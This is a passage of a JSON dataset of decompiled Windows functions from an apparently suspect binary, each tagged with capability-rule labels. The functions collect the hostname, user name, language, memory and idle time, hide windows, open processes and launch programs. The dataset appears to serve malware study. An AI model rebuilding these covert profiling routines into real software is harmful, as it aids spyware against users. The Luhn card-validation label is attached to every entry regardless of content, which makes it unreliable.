        "decompiled_code": "\nvoid __cdecl fcn.004866f4 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack48 = 0x486716;\n    fcn.00405f08();\n    uStack52 = 0x486814;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x4867cd;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    uVar1 = fcn.004058fc();\n    var_14h = sub.wsock32.dll_inet_addr(uVar1);\n    iVar2 = sub.wsock32.dll_gethostbyaddr(&fcn.004866f4::var_14h, 4, 2);\n    uVar3 = iVar2 == 0;\n    if (!uVar3) {\n        fcn.0040a9a4(0x48682c, var_4h, *0x4ab264);\n        fcn.00405800(0x486838, 0);\n    }\n    fcn.00405894();\n    if (uVar3) {\n        *0x4a4ae0 = 0;\n        *0x4a4adc = 1;\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 443
    },
    "0048742c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048742c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x487445;\n    fcn.004058ec();\n    uStack36 = 0x48749e;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0xc);\n    fcn.004054c0();\n    *(iVar1 + 4) = param_2;\n    *(iVar1 + 8) = var_8h;\n    uVar2 = 0;\n    sub.kernel32.dll_CreateThread(0, 0, fcn.00487320, iVar1, 0, &fcn.0048742c::var_ch);\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x4874a5);\n    return;\n}\n",
        "token_count": 278
    },
    "004877c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004877c0 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x4878f5;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405664();\n    fcn.00405a48(&var_1ch);\n    fcn.00405964();\n    fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    _var_18h = fcn.0040b63c();\n    if (_var_18h == *0x487910) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x487914;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread();\n        _var_18h = _var_18h - *0x487918;\n    } while (*0x487910 < _var_18h);\n    fcn.0048c190();\n    fcn.00405784();\n    fcn.004938a4();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 418
    },
    "00487ba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00487ba8 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x487cdd;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405664();\n    fcn.00405a48(&var_1ch);\n    fcn.00405964();\n    fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    _var_18h = fcn.0040b63c();\n    if (_var_18h == *0x487cf8) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x487cfc;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread();\n        _var_18h = _var_18h - *0x487d00;\n    } while (*0x487cf8 < _var_18h);\n    fcn.0048c190();\n    fcn.00405784();\n    fcn.004938a4();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 421
    },
    "00487e74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00487e74(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_16ch;\n    uint var_168h;\n    uint var_154h;\n    uint var_4h;\n    \n    puStack396 = &stack0xfffffffc;\n    puStack384 = 0x487e95;\n    fcn.004058ec();\n    puStack384 = 0x487ea6;\n    fcn.00405f08();\n    uStack388 = 0x487f73;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    uStack400 = 0x487f30;\n    uStack404 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe6c;\n    puStack384 = &stack0xfffffffc;\n    fcn.00405784();\n    iVar1 = fcn.0040a384();\n    while (iVar1 == 0) {\n        uStack404 = 0x487f9c;\n        fcn.00405800();\n        iVar1 = fcn.0040a3d4();\n    }\n    fcn.0040a3f8();\n    *in_FS_OFFSET = uStack404;\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x487f7a;\n    uStack388 = 0x487f59;\n    fcn.0040546c();\n    uStack388 = 0x487f6a;\n    fcn.00405fd8();\n    uStack388 = 0x487f72;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 406
    },
    "0048992c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __fastcall fcn.0048992c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 4;\n    do {\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x48994d;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    var_8h = param_2;\n    fcn.004058ec();\n    var_1ch = 0x489955;\n    fcn.004058ec();\n    var_20h = 0x489b54;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048992c::var_24h;\n    puStack44 = 0x4ad454;\n    puStack48 = 0x48996d;\n    var_1ch = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack52 = 0x489b32;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = (**(**0x4ad450 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f60();\n        *in_FS_OFFSET = puStack56;\n        puStack48 = 0x489b5b;\n        puStack52 = 0x489b53;\n        fcn.00405490();\n        return;\n    }\n    iVar1 = (**(**0x4ad450 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x4ad450 + 0xc))();\n            puStack44 = &fcn.0048992c::var_ch;\n            puStack48 = 0x4899cb;\n            fcn.00405a48();\n            puStack48 = 0x4899db;\n            fcn.00405964();\n            puStack48 = 0x4899e8;\n            fcn.00405a48();\n            puStack48 = 0x4899f7;\n            fcn.004059a4();\n            puStack48 = &fcn.0048992c::var_10h;\n            puStack52 = 0x489a08;\n            fcn.00405a48();\n            puStack52 = 0x489a18;\n            fcn.00405964();\n            puStack52 = 0x489a25;\n            fcn.00405a48();\n            puStack52 = 0x489a34;\n            fcn.004059a4();\n            puStack52 = &fcn.0048992c::var_14h;\n            puStack56 = 0x489a45;\n            fcn.00405a48();\n            puStack56 = 0x489a55;\n            fcn.00405964();\n            puStack56 = 0x489a62;\n            fcn.00405a48();\n            puStack56 = 0x489a71;\n            fcn.004059a4();\n            puStack56 = &fcn.0048992c::var_18h;\n            iVar2 = fcn.00405a48();\n            uVar3 = iVar2 == 1;\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405504();\n            fcn.00405894();\n            if (uVar3) {\n                fcn.00405504();\n                fcn.00405800(var_1ch, 0x489b6c, var_18h, 0x489b6c, var_14h, 0x489b6c, var_10h, 0x489b6c, var_ch);\n                (**(**0x4ad450 + 0x20))();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack56;\n    puStack48 = 0x489b39;\n    puStack52 = 0x4ad454;\n    puStack56 = 0x489b31;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 1159
    },
    "0048a0fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048a0fc(uint arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    puStack44 = 0x48a120;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack44 = 0x48a128;\n    fcn.004058ec();\n    puStack44 = 0x48a130;\n    fcn.004058ec();\n    puStack44 = 0x48a138;\n    fcn.004058ec();\n    uStack48 = 0x48a260;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack56 = 0x4ad454;\n    puStack60 = 0x48a150;\n    puStack44 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack64 = 0x48a229;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack60 = &stack0xfffffffc;\n    cVar1 = fcn.00489b70();\n    if (cVar1 != '\\0') {\n        fcn.00404f60();\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x48a267;\n        uStack64 = 0x48a24a;\n        fcn.00405490();\n        uStack64 = 0x48a257;\n        fcn.00405490();\n        uStack64 = 0x48a25f;\n        fcn.0040546c();\n        return;\n    }\n    fcn.00405800(0x48a284, arg_8h, 0x48a278, var_ch, 0x48a278, var_8h, 0x48a278, var_4h);\n    (**(**0x4ad450 + 0x38))();\n    puVar2 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x10);\n    uVar3 = fcn.00409dd8();\n    *puVar2 = uVar3;\n    fcn.00409a78();\n    fcn.004054c0();\n    fcn.00409a78();\n    fcn.004054c0();\n    puVar2[3] = 0;\n    uVar3 = sub.kernel32.dll_CreateThread(0, 0, fcn.00489684, puVar2, 0, &fcn.0048a0fc::var_14h);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar3;\n    sub.kernel32.dll_LeaveCriticalSection(0x4ad454, 0x48a230);\n    return;\n}\n",
        "token_count": 755
    },
    "0048a288": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a288(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x48a29e;\n    fcn.004058ec();\n    uStack20 = 0x48a2df;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405784();\n    fcn.004938a4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x48a2e6;\n    uStack20 = 0x48a2de;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 196
    },
    "0048a8ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "open process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a8ac(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint hObject;\n    uint var_4h;\n    \n    uStack32 = 0x48a8c6;\n    puVar1 = fcn.00402ef0();\n    *puVar1 = 0x28;\n    uStack36 = 0;\n    uStack40 = 0x1f0fff;\n    puStack44 = 0x48a8da;\n    uVar2 = sub.kernel32.dll_OpenProcess();\n    uStack48 = 0x48a928;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar3 = fcn.0044cca0();\n    if (iVar3 == 0) {\n        *param_2 = 0;\n    }\n    else {\n        *param_2 = puVar1[3];\n    }\n    fcn.00402f0c();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x48a92f;\n    uStack52 = 0x48a927;\n    uStack48 = uVar2;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 347
    },
    "0048af20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048af20(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea0;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint hObject;\n    \n    puStack320 = &stack0xfffffffc;\n    uStack324 = 0x48b02e;\n    uStack328 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb8;\n    puStack332 = 0x48af5e;\n    uVar1 = fcn.0044cf40();\n    uStack336 = 0x48b009;\n    uStack340 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeac;\n    puStack332 = &stack0xfffffffc;\n    iVar2 = fcn.0044cf60();\n    if (iVar2 == 0) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0048ad08(*in_EAX);\n        in_stack_fffffea0 = 0x48b044;\n        fcn.00405800(0x48b044, 0);\n        while (iVar2 = fcn.0044cf80(),  iVar2 != 0) {\n            fcn.0048ad08(*in_EAX);\n            in_stack_fffffea0 = 0x48b044;\n            fcn.00405800();\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffea0;\n    sub.kernel32.dll_CloseHandle_1(uVar1, 0x48b010);\n    return;\n}\n",
        "token_count": 411
    },
    "0048b764": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0048b764(void)\n\n{\n    uint uStack28;\n    uchar auStack24 [20];\n    \n    uStack28 = 0x10;\n    sub.kernel32.dll_GetComputerNameA(auStack24, &uStack28);\n    fcn.004056dc();\n    return;\n}\n",
        "token_count": 68
    },
    "0048b8e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0048b8e0(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x48b904, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48b914, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 91
    },
    "0048b9ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b9ac(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x48b9c8, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 69
    },
    "0048c190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get session user name"
        ],
        "decompiled_code": "\nvoid fcn.0048c190(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.advapi32.dll_GetUserNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0048c17c();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0048c1cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0048c1cc(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.kernel32.dll_GetComputerNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0048c17c();\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0048c434": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c434(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x48c491;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.004214dc();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 140
    },
    "0048c650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c650(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x48c6ad;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.004214dc();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 141
    },
    "0048c9f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "identify system language via API"
        ],
        "decompiled_code": "\nvoid fcn.0048c9f8(void)\n\n{\n    ushort uVar1;\n    uchar auStack108 [104];\n    \n    uVar1 = sub.kernel32.dll_GetUserDefaultLangID();\n    sub.kernel32.dll_VerLanguageNameA(uVar1, auStack108, 100);\n    fcn.004056dc();\n    return;\n}\n",
        "token_count": 77
    },
    "0048cc94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0048cc94(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack28;\n    uint uStack20;\n    \n    uVar5 = 0;\n    uStack20 = 0;\n    iVar4 = 0;\n    puStack36 = &uStack20;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 1;\n    uStack52 = in_EAX;\n    uStack28 = param_2;\n    iVar1 = sub.advapi32.dll_GetTokenInformation();\n    if (iVar1 == 0) {\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        if (iVar1 != 0x7a) {\n            return 0;\n        }\n        uVar2 = sub.kernel32.dll_GetProcessHeap(8, uStack40);\n        iVar4 = sub.kernel32.dll_HeapAlloc(uVar2);\n        uVar3 = uStack52;\n        if (iVar4 == 0) {\n            return 0;\n        }\n        uStack52 = 0;\n        iVar1 = sub.advapi32.dll_GetTokenInformation(uVar2, 1, iVar4, uVar3, &uStack52);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    iVar1 = fcn.0048cac8();\n    if (iVar1 != 0) {\n        uVar3 = sub.kernel32.dll_GetProcessHeap(0, iVar4);\n        iVar1 = sub.kernel32.dll_HeapFree(uVar3);\n        if (iVar1 != 0) {\n            uVar5 = 0xffffffff;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 438
    },
    "0048cd44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048cd44(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_fffffecc;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uchar auStack280 [272];\n    \n    puStack284 = 0x48cd55;\n    fcn.0040546c();\n    uStack288 = 0xffffffff;\n    uStack292 = 8;\n    uStack296 = 0x48cd5f;\n    puStack284 = &stack0xfffffee8;\n    uStack296 = sub.kernel32.dll_GetCurrentThread();\n    iVar1 = sub.advapi32.dll_OpenThreadToken();\n    if (iVar1 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0x3f0) {\n            in_stack_fffffecc = sub.kernel32.dll_GetCurrentProcess(8, &stack0xfffffed8);\n            iVar1 = sub.advapi32.dll_OpenProcessToken(in_stack_fffffecc);\n        }\n    }\n    if (iVar1 != 0) {\n        fcn.00403ae4();\n        iVar1 = fcn.0048cc94();\n        if (iVar1 != 0) {\n            fcn.004056dc();\n        }\n        sub.kernel32.dll_CloseHandle_1(in_stack_fffffecc);\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "0048d0a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get memory capacity"
        ],
        "decompiled_code": "\nvoid fcn.0048d0a0(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpBuffer;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    puStack88 = &stack0xfffffffc;\n    uStack80 = 0x48d1a6;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    uStack92 = 0x48d16c;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack96;\n    lpBuffer = 0x20;\n    sub.kernel32.dll_GlobalMemoryStatus(&lpBuffer);\n    fcn.0048f81c(SUB108(var_1ch - var_18h, 0), var_1ch - var_18h >> 0x40);\n    fcn.0048f81c(var_1ch, 0x48d1bc, 0);\n    fVar1 = var_18h;\n    uVar3 = fVar1 >> 0x20;\n    fcn.0048f81c(SUB104(fVar1, 0), uVar3, fVar1 >> 0x40, 0x48d1c8, 0);\n    uVar2 = 0x48d1d4;\n    fcn.00405800(0x48d1d4, 0);\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405490(0x48d1ad);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 470
    },
    "0048d258": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048d258(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x48d26e;\n    fcn.004058ec();\n    uStack20 = 0x48d2bc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.0040f130(0);\n    uVar1 = fcn.004058fc();\n    uVar1 = fcn.004058fc(uVar1);\n    uVar2 = 0;\n    sub.user32.dll_MessageBoxA_1(0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x48d2c3);\n    return;\n}\n",
        "token_count": 235
    },
    "0048d520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0048d520(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x48d536;\n    fcn.004058ec();\n    uStack20 = 0x48d58d;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405784(0, 0);\n    uVar1 = fcn.004058fc();\n    uVar2 = 0;\n    sub.shell32.dll_ShellExecuteA(0, 0x48d5ac, 0x48d5a4, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x48d594);\n    return;\n}\n",
        "token_count": 235
    },
    "0048d788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.0048d788(void)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack36 = 0x48d7a1;\n    fcn.004058ec();\n    uStack40 = 0x48d87a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x48d7bb;\n    puStack36 = &stack0xfffffffc;\n    piVar1 = fcn.0042cbe0();\n    uStack52 = 0x48d855;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48d825;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    (**(*piVar1 + 0x4c))();\n    fcn.00446474();\n    fcn.0048d2c8();\n    fcn.00405738();\n    (**(*piVar1 + 0x50))();\n    *in_FS_OFFSET = uStack68;\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x48d85c;\n    uStack52 = 0x48d854;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 403
    },
    "0048d948": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0048d948(void)\n\n{\n    int32_t iVar1;\n    uint32_t auStack8 [2];\n    \n    auStack8[0] = 8;\n    sub.user32.dll_GetLastInputInfo(auStack8);\n    iVar1 = sub.kernel32.dll_GetTickCount_1();\n    return (iVar1 - auStack8[0]) / 1000 | auStack8[0] << 0x20;\n}\n",
        "token_count": 100
    },
    "0048d970": {
        "rules": [
